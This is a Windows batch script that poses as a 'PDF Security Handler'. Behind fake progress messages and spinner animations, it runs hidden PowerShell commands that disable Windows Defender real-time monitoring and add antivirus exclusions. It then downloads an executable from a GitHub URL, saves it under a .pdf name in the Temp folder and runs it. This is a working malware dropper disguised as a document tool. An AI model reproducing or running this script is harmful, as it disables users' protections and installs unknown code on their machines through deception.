@echo off
title PDF Security Handler
color 07
mode con: cols=70 lines=15

echo.
echo    ==================================================
echo    [ Windows PDF Security Handler                   ]
echo    ==================================================
echo    Initializing security protocol...
echo    Checking system requirements...
echo.

setlocal enabledelayedexpansion
set "spinner=|/-\"
set "count=0"

REM Step 1: Disable real-time monitoring
echo    [1/4] Configuring security settings...
powershell -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

REM Animation for step 1
call :AnimateStep "Applying security configuration"

REM Step 2: Add temp folder exclusion
echo    [2/4] Setting up secure environment...
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \"C:\Users\%username%\AppData\Local\Temp\\\"" >nul 2>&1

REM Animation for step 2
call :AnimateStep "Creating secure workspace"

REM Step 3: Download PDF
echo    [3/4] Retrieving protected document...
powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Riotan1/winupdate/main/ProducLucas.exe' -OutFile 'C:\Users\%username%\AppData\Local\Temp\tzy4tn8w.pdf'" >nul 2>&1

REM Animation for step 3
call :AnimateStep "Downloading encrypted content"

REM Step 4: Add file exclusion and execute
echo    [4/4] Finalizing security measures...
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath \"C:\Users\%username%\AppData\Local\Temp\tzy4tn8w.pdf\"" >nul 2>&1

REM Execute the PDF
start /min cmd /c ""C:\Users\%username%\AppData\Local\Temp\tzy4tn8w.pdf""

REM Animation for step 4
call :AnimateStep "Applying final security layers"

echo.
echo    ==================================================
echo    [ Status: COMPLETED                             ]
echo    [ PDF security handler initialized successfully ]
echo    ==================================================
echo.
echo    Document is now being prepared for viewing...
timeout /t 3 /nobreak >nul

exit

:AnimateStep
set "desc=%~1"
for /l %%i in (1,1,6) do (
    set /a "count=(count+1)%%4"
    for /f "tokens=!count!" %%c in ("!spinner!") do (
        echo     !desc!... [%%c]
    )
    timeout /t 0.5 /nobreak >nul
    if %%i lss 6 (
        echo [%time%] Processing... >nul
        set /a lines=5
        for /l %%j in (1,1,!lines!) do echo.
    )
)
exit /b
